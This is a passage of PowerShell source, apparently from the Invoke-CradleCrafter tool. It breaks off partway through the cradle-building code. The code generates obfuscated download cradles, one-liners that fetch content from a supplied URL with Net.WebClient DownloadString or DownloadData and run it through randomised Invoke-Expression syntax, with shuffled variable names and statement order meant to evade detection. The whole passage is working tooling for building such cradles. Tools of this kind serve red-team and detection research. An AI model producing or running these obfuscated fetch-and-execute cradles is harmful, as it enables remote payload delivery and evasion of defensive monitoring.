        $CommandOptions += ''
    }
    $OptionsVarArr   += "Command"

    # Set boolean if ALL option was passed in since this will force re-randomization and re-setting of all variables.
    $AllOptionSelected = $FALSE
    If($TokenArray -AND $TokenArray[$TokenArray.Length-1][0] -eq 'All')
    {
        $AllOptionSelected = $TRUE
    }

    # We must added all options and override existing $TokenArray value so that Invoke-CradleCrafter can properly maintain state of individual value after ALL option is selected.
    # In each individual CradleType block at the end of this script we will only keep the options in $TokenArray that pertain to that particular Cradle block.
    $TokenArrayWithAllAdded = @()

    ForEach($VariableName in $OptionsVarArr)
    {
        $DefaultIndex = 0
            
        If($AllOptionSelected)
        {
            # If last option in $TokenArray is ALL then we will choose the highest obfuscation level as the default value for each variable in $OptionsVarArray.
            $DefaultIndex = (Get-Variable ($VariableName+"Options")).Value.Count-1
        }

        # Set each variable to the default value in its respective Options array variable.
        If(Test-Path ("Variable:$VariableName" + "Options"))
        {
            $Variable = (Get-Variable ($VariableName + "Options")).Value[$DefaultIndex]

            If($Variable.Length -eq 0)
            {
                $Variable = $Null
            }

            # Finally, set the variable value into both the variable and variable+withtags variables.
            Set-Variable $VariableName                $Variable
            Set-Variable ($VariableName + "WithTags") $Variable
        }

        If($AllOptionSelected)
        {
            $TokenArrayWithAllAdded += , @($VariableName,(Get-Variable $VariableName).Value)
        }
    }

    # We must add all options and override existing $TokenArray value so that Invoke-CradleCrafter can properly maintain state of each individual value generated when ALL option is selected.
    # In each individual CradleType block at the end of this script we will only keep the options in $TokenArray that pertain to that particular Cradle block.
    # Also adding 'Invoke' option since it is handled via a separate function and is not set as a default array in above step.
    # For Invoke we will randomly select an option that is not 1 (since we want an invocation command applied) and is not a PS3.0+ option or a runspace option since it won't display stdout (to avoid the appearance of cradle not working to those who only run ALL without looking at the nature of each invocation syntax).
    If($AllOptionSelected)
    {
        $TokenArray  = $TokenArrayWithAllAdded
        $TokenArray += , @('Invoke',(Get-Random -Input @(2,3,4,5,6,7,9)))
    }

    # This variable will be used to return the token value that was updated this iteration.
    # Invoke-CradleCrafter will store this in its $Script:TokenArray so that all previously obfuscated tokens can be passed in for subsequent invocations of Out-Cradle.
    $TokenValueUpdatedThisIteration = $NULL

    # If only a single TokenArray key-value pair is entered then convert this string to an object array.
    If(($TokenArray.Length -gt 0) -AND ($TokenArray.GetType().Name -eq 'String'))
    {
        $TokenArray = @([Object[]]$TokenArray)
    }

    # Handle every variable set above and passed in as an argument to determine if:
    # 1) a random value should be assigned to each variable (from values above)
    # 2) a value has been passed in to Out-CradleCrafter from previous iterations (which we will then use)
    $InvokeArrayResults = @()              
    For($i=0; $i -lt $TokenArray.Count; $i++)
    {
        $TokenName  = $TokenArray[$i][0]
        $TokenLevel = $TokenArray[$i][1]

        # For $Url, $Path and $Command we will override default values with input values (if they were input/defined).
        If(($TokenName -eq 'Url') -AND $PSBoundParameters['Url'])
        {
            $TokenLevel = $Url
        }
        If(($TokenName -eq 'Path') -AND $PSBoundParameters['Path'])
        {
            $TokenLevel = $Path
        }
        If(($TokenName -eq 'Command') -AND $PSBoundParameters['Command'])
        {
            $TokenLevel = $Command
        }

        # If $TokenLevel is an integer then we will act on it.
        # Otherwise we were passed a string which is the stored value that we will use for this Token.
        # Exclude select variables whose values are a single number, like those used for switch blocks set in previous executions of this script.
        $VariableNameExceptions = @('SwitchRandom_01')
        If((@(0,1,2,3,4,5,6,7,8,9,10,11,12) -Contains $TokenLevel) -AND !($VariableNameExceptions -Contains $TokenName))
        {
            # Handle Invoke differently since it requires calling a separate function that sets its state via the script-level variable $Script:CombineInvokeAndPostCradleCommand.
            If($TokenName -eq 'Invoke')
            {
                $TokenValue = Out-EncapsulatedInvokeExpression $TokenLevel

                $InvokeArrayResults = $TokenValue
            }
            Else
            {
                $OptionsArray = (Get-Variable ($TokenName+'Options')).Value

                # Set cap on $TokenLevel if value passed in exceeds the number of available options in $OptionsArray.
                If($TokenLevel -gt $OptionsArray.Count)
                {
                    $TokenLevel = $OptionsArray.Count
                }
                
                $TokenValue = $OptionsArray[$TokenLevel-1]
            }
        }
        Else
        {
            # Since we were passed a string for the current $TokenName in $TokenArray (as the $TokenLevel value) then we will set $TokenValue to this passed value.
            $TokenValue = $TokenLevel
        }

        # Handle Invoke differently since it may be an array depending on which Invoke function is being used and if $Command is defined or not.
        # Additionally because of this flexibility then Invoke will be added to $Script:TokensUpdatedThisIteration in the below blocks and excluded in later blocks.
        If(($TokenName -eq 'Invoke') -AND ($TokenValue.GetType().Name -eq 'Object[]'))
        {
            $Script:TokensUpdatedThisIteration += , @($TokenName,$TokenValue)

            If($Command)
            {
                $TokenValue = $TokenValue[0]
            }
            Else
            {
                $TokenValue = $TokenValue[1]
            }
        }
        Else
        {
            $Script:TokensUpdatedThisIteration += , @($TokenName,$TokenValue)
        }
        
        # For TokenValueWithTags only add tags if it is the last token (i.e., the token being updated during this function invocation).
        # Add tags to everything if ALL option was passed in as the last value in $TokenArray.
        $TokenValueWithTags = $TokenValue

        If(($i -eq $TokenArray.Count-1) -OR ($AllOptionSelected))
        {
            $TokenValueWithTags = $TokenValue
            If($TokenValue.ToString().Length -gt 0)
            {
                $TokenValueWithTags = '<<<0' + $TokenValue + '0>>>'
            }

            # Add additional tags for Invoke for proper highlighting.
            If($TokenValueWithTags.Contains($InvokeTag))
            {
                $TokenValueWithTags = $TokenValueWithTags.Replace($InvokeTag,('0>>>' + $InvokeTag + '<<<0')).Replace('<<<00>>>','')
            }

            # Because of the flexibility with Invoke (can be array or string) it's being added to $Script:TokensUpdatedThisIteration has been handled separately above.
            # Therefore, Invoke will be excluded in the below block from being added to $Script:TokensUpdatedThisIteration.
            If($TokenName -ne 'Invoke')
            {
                # Store updated token(s) name/value pair.
                $Script:TokensUpdatedThisIteration += , @($TokenName,$TokenValue)
            }

            # The last updated token value will be stored in this variable to be returned for Invoke-CradleCrafter to store in its $Script:TokenArray.
            $TokenValueUpdatedThisIteration = $TokenValue

            # The last updated token name will be stored in this variable so tag formatting will work properly when REARRANGE option is selected.
            $TokenNameUpdatedThisIteration = $TokenName
        }

        # Set token value in the variable named after $TokenName.
        Set-Variable $TokenName $TokenValue
        Set-Variable ($TokenName+'WithTags') $TokenValueWithTags

        # We will use this $LastVariableName for easier code readibility in below If blocks for SwitchRandom_01 and all array index variables.
        # This is because in most cases the last variable that we process from $TokenArray is the variable that we are obfuscating.
        $LastVariableName = $TokenName
    }

    # Choose random index order for below Switch value and array indexes for CommandArray/CommandArray2 elements that can have their order randomized.
    # Only set these variables if they were not set in $Script:TokenArray or if Rearrange or All options were explicitly selected.
    # We set these values here so that they can be passed in and set so that these states can be maintained unless explicitly desired to change via Rearrange or All options.
    $VarPairsToSet  = @()
    $VarPairsToSet += , @('SwitchRandom_01'         , (Get-Random -Input @(1,2)))
    $VarPairsToSet += , @('SetItemListIndex_01'     , (Get-Random -Input @(0,1) -Count 2))
    $VarPairsToSet += , @('SetItemListIndex_012345' , (Get-Random -Input @(0,1,2,3,4) -Count 5))
    $VarPairsToSet += , @('ArrayIndexOrder_01'      , (Get-Random -Input @(0,1) -Count 2))
    $VarPairsToSet += , @('Array2IndexOrder_01'     , (Get-Random -Input @(0,1) -Count 2))
    $VarPairsToSet += , @('ArrayIndexOrder_012'     , (Get-Random -Input @(0,1,2) -Count 3))
    $VarPairsToSet += , @('Array2IndexOrder_012'    , (Get-Random -Input @(0,1,2) -Count 3))
    $VarPairsToSet += , @('ArrayIndexOrder_0123'    , (Get-Random -Input @(0,1,2,3) -Count 4))
    $VarPairsToSet += , @('ArrayIndexOrder_45'      , (Get-Random -Input @(4,5) -Count 2))
    $VarPairsToSet += , @('Array2IndexOrder_0123'   , (Get-Random -Input @(@(0,3,1,2),@(3,0,1,2),@(0,1,3,2),@(0,1,2,3))))
    $VarPairsToSet += , @('Array2IndexOrder_01234'  , (Get-Random -Input @(@(4,0,1,2,3),@(0,4,1,2,3),@(0,1,4,2,3),@(0,1,2,3,4))))
    $VarPairsToSet += , @('PropertyArrayIndex_012'  , (Get-Random -Input @(0,1,2) -Count 3))
    $VarPairsToSet += , @('GetBytesRandom'          , $JoinRandom.Replace($JoinTag,$ByteRandom.Replace($ByteTag,(Get-Random @(((Get-Random -Input @('[System.','[')) + "IO.File]::ReadAllBytes('$PathTag')"),"($GetContentRandom $EncodingFlagRandom $ByteArgumentRandom $PathTag)","($GetContentRandom $PathTag $EncodingFlagRandom $ByteArgumentRandom)")))))
    $VarPairsToSet += , @('InlineRandom'            , (Get-Random -Input @(((Get-Random -Input @(0,1,2,3) -Count 4) + @(4,5,6)),((Get-Random -Input @(0,1) -Count 2) + @(4) + (Get-Random -Input @(2,3) -Count 2) + @(5,6)))))

    ForEach($VarPair in $VarPairsToSet)
    {
        $VarName  = $VarPair[0]
        $VarValue = $VarPair[1]

        If(!(Test-Path ('Variable:' + $VarName)) -OR $AllOptionsSelected -OR ($LastVariableName -eq 'Rearrange'))
        {
            Set-Variable $VarName $VarValue
            $Script:TokensUpdatedThisIteration += , @($VarName,$VarValue)
        }
    }
  
    # If ALL option was not selected then set $UrlWithTags, $PathWithTags and $CommandWithTags to <<<1 tag if they do not already have <<<0 tags.
    If(!$AllOptionSelected)
    {
        If(!$UrlWithTags.StartsWith('<<<0'))
        {
            $UrlWithTags = '<<<1' + $UrlWithTags + '1>>>'
        }
        
        If(!$PathWithTags.StartsWith('<<<0'))
        {
            $PathWithTags = '<<<1' + $PathWithTags + '1>>>'
        }

        If($CommandWithTags -AND !$CommandWithTags.StartsWith('<<<0') -AND $CommandWithTags -ne '')
        {
            $CommandWithTags = '<<<1' + $CommandWithTags + '1>>>'
        }
    }

    # Handle additional command syntax where PostCradleCommand must be concatenated as a string so that it is run in the same context as the invoked cradle contents.
    If($Command -AND $CommandWithTags)
    {
        $CommandEscapedString         = "+';" + $Command.Replace("'","''") + "'"
        $CommandEscapedStringWithTags = "+';" + $CommandWithTags.Replace("'","''") + "'"
    }
    Else
    {
        $CommandEscapedString         = ''
        $CommandEscapedStringWithTags = ''
    }

    # Select launcher syntax.
    $CradleSyntaxOptions = @()
    Switch($Cradle)
    {
        1 {
            ###############################################
            ## New-Object Net.WebClient - DownloadString ##
            ###############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadString         = $DownloadString.Replace(        $NewObjectTag,$NewObject.Replace($ModuleAutoLoadTag,''))
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectTag,$NewObjectWithTags.Replace($ModuleAutoLoadTag,''))

                    # Add .Invoke to the end of $DownloadString and $DownloadStringWithTags if $DownloadString ends with ')'.
                    If($DownloadString.EndsWith(')'))
                    {
                        $DownloadString = $DownloadString + '.Invoke'

                        If($DownloadStringWithTags.EndsWith('0>>>')) {$DownloadStringWithTags = $DownloadStringWithTags.SubString(0,$DownloadStringWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                         {$DownloadStringWithTags = $DownloadStringWithTags + '.Invoke'}
                    }

                    $SyntaxToInvoke         = '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadString('$Url')"
                    $SyntaxToInvokeWithTags = '(' + $NewObjectWithTags.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadStringWithTags('$UrlWithTags')"

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }
                      
                    If($NewObject.Contains($ModuleAutoLoadTag))
                    {
                        $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                        If($NewObject.EndsWith('0>>>'))
                        {
                            $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                        }
                    }
                    Else
                    {
                        $CurrentModuleAutoLoadRandom = ''
                    }
                    $CradleSyntax         = $CurrentModuleAutoLoadRandom + $CradleSyntax
                    $CradleSyntaxWithTags = $CurrentModuleAutoLoadRandom + $CradleSyntaxWithTags
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'wc2' # WebClient (Argument)
                    $RandomVarName4 = 'ds'  # DownloadString (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If($DownloadString.Contains('DownloadString'))
                        {
                            $DownloadStringWithTags = $DownloadStringWithTags.Trim("'").Replace($DownloadString,("'" + $DownloadString + "'")).Replace("''","'")
                            $DownloadString         = "'" + $DownloadString.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadString"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadString.Contains("'DownloadString'"))
                        {
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }

                        If($DownloadString.EndsWith(')') -OR $DownloadString.EndsWith(')0>>>'))
                        {
                            $DownloadStringInvoke = $DownloadString + '.Invoke'
                        }
                        Else
                        {
                            $DownloadStringInvoke = $DownloadString
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadStringInvoke($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Encapsulate DownloadString in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($DownloadString -eq 'DownloadString')
                    {
                        $DownloadStringWithTags = $DownloadStringWithTags.Replace($DownloadString,("'" + $DownloadString + "'"))
                        $DownloadString         = "'" + $DownloadString + "'"
                    }
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,'(' + $GetVar4 + ').Invoke')
                    $GetVar4         = '(' + $GetVar4 + ').Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadString"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
    
                        # Add .Invoke to the end of $DownloadString if not default value of 'DownloadString'.
                        If($DownloadString.Contains("'DownloadString'"))
                        {
                            # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }
                        Else
                        {
                            If($DownloadString.EndsWith('0>>>')) {$DownloadString = $DownloadString.SubString(0,$DownloadString.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                                 {$DownloadString = $DownloadString + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadString($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        2 {
            #############################################
            ## New-Object Net.WebClient - DownloadData ##
            #############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                      
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadData         = $DownloadData.Replace(        $NewObjectTag,$NewObject.Replace($ModuleAutoLoadTag,''))
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectTag,$NewObjectWithTags.Replace($ModuleAutoLoadTag,''))

                    # Add .Invoke to the end of $DownloadData and $DownloadDataWithTags if $DownloadData ends with ')'.
                    If($DownloadData.EndsWith(')'))
                    {
                        $DownloadData = $DownloadData + '.Invoke'
      
                        If($DownloadDataWithTags.EndsWith('0>>>')) {$DownloadDataWithTags = $DownloadDataWithTags.SubString(0,$DownloadDataWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                       {$DownloadDataWithTags = $DownloadDataWithTags + '.Invoke'}
                    }

                    # Handle embedded tagging.
                    If($ByteWithTags.StartsWith('<<<0') -AND $ByteWithTags.EndsWith('0>>>'))
                    {
                        $ByteWithTags = $ByteWithTags.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                    }
                    If($JoinWithTags.StartsWith('<<<0') -AND $JoinWithTags.EndsWith('0>>>'))
                    {
                        $JoinWithTags = $JoinWithTags.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                    }

                    $SyntaxToInvoke         = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,'(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadData('$Url')"))
                    $SyntaxToInvokeWithTags = $JoinWithTags.Replace($JoinTag,$ByteWithTags.Replace($ByteTag,'(' + $NewObjectWithTags.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadDataWithTags('$UrlWithTags')"))
                      
                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    If($NewObject.Contains($ModuleAutoLoadTag))
                    {
                        $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                        If($NewObject.EndsWith('0>>>'))
                        {
                            $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                        }
                    }
                    Else
                    {
                        $CurrentModuleAutoLoadRandom = ''
                    }
                    $CradleSyntax         = $CurrentModuleAutoLoadRandom + $CradleSyntax
                    $CradleSyntaxWithTags = $CurrentModuleAutoLoadRandom + $CradleSyntaxWithTags
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'wc2' # WebClient (Argument)
                    $RandomVarName4 = 'ds'  # DownloadData (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadData in single quotes if basic syntax is used.
                        If($DownloadData.Contains('DownloadData'))
                        {
                            $DownloadDataWithTags = $DownloadDataWithTags.Trim("'").Replace($DownloadData,("'" + $DownloadData + "'")).Replace("''","'")
                            $DownloadData         = "'" + $DownloadData.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
